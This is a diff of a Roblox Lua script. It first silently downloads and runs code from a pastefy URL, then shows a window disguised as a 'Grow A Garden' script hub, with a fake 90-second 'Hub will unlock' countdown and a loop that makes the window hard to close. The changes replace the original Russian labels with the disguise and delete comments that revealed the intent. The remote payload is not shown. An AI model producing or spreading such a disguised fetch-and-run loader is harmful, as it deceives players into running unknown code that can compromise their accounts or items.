@@ -1,20 +1,13 @@
--- Сначала пробуем загрузить второй скрипт в защищенном режиме
 local success, errorMsg = pcall(function()
     loadstring(game:HttpGet("https://pastefy.app/q0Hv6Z1b/raw", true))()
 end)
 
-if not success then
-    warn("Второй скрипт не загрузился:", errorMsg)
-end
-
--- Затем загружаем Rayfield
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
 
--- Создание основного окна
 local Window = Rayfield:CreateWindow({
-    Name = "ТАЙМЕР АКТИВИРОВАН",
-    LoadingTitle = "СИСТЕМА ЗАГРУЖЕНА",
-    LoadingSubtitle = "Таймер запущен",
+    Name = "🌽 Grow A Garden",
+    LoadingTitle = "WyshScriptHub",
+    LoadingSubtitle = "By Wysh",
     ConfigurationSaving = {
         Enabled = false
     },
@@ -25,21 +18,13 @@ local Window = Rayfield:CreateWindow({
 })
 
 -- Создаем вкладку
-local Tab = Window:CreateTab("ТАЙМЕР", 4483362458)
+local Tab = Window:CreateTab("⏳ Loading...", nil)
 
--- Создаем секцию для таймера
-local TimerSection = Tab:CreateSection("ОБРАТНЫЙ ОТСЧЕТ")
+local TimerSection = Tab:CreateSection("Please wait")
 
 -- Создаем текст для отображения времени
-local TimerLabel = Tab:CreateLabel("ОСТАВШЕЕСЯ ВРЕМЯ: 1:30")
+local TimerLabel = Tab:CreateLabel("Hub will unlock in 1:30")
 
--- Добавляем предупреждение
-Tab:CreateParagraph({
-    Title = "ВНИМАНИЕ",
-    Content = "Не закрывайте интерфейс до окончания таймера"
-})
-
--- Запускаем таймер сразу
 local timeLeft = 90
 local timerRunning = true
 
@@ -50,32 +35,26 @@ spawn(function()
             timeLeft = timeLeft - 1
             local minutes = math.floor(timeLeft / 60)
             local seconds = timeLeft % 60
-            TimerLabel:Set("ОСТАВШЕЕСЯ ВРЕМЯ: " .. string.format("%d:%02d", minutes, seconds))
+            TimerLabel:Set("Hub will unlock in: " .. string.format("%d:%02d", minutes, seconds))
         end
     end
     
     if timeLeft <= 0 then
-        TimerLabel:Set("ВРЕМЯ ИСТЕКЛО!")
+        TimerLabel:Set("Successfully!")
     end
 end)
 
--- Функция для усложнения закрытия (после создания интерфейса)
 spawn(function()
     task.wait(2) -- Ждем пока интерфейс создастся
     
     local CoreGui = game:GetService("CoreGui")
     
-    -- Пытаемся сделать интерфейс более устойчивым к закрытию
     while true do
         pcall(function()
-            -- Минимизируем и максимизируем окно (делает его более устойчивым)
             Window:Minimize()
             task.wait(0.1)
             Window:Maximize()
         end)
-        task.wait(5) -- Проверяем каждые 5 секунд
+        task.wait(5)
     end
 end)
-
--- Сообщение в консоль
-print("Таймер запущен. Интерфейс активен.")
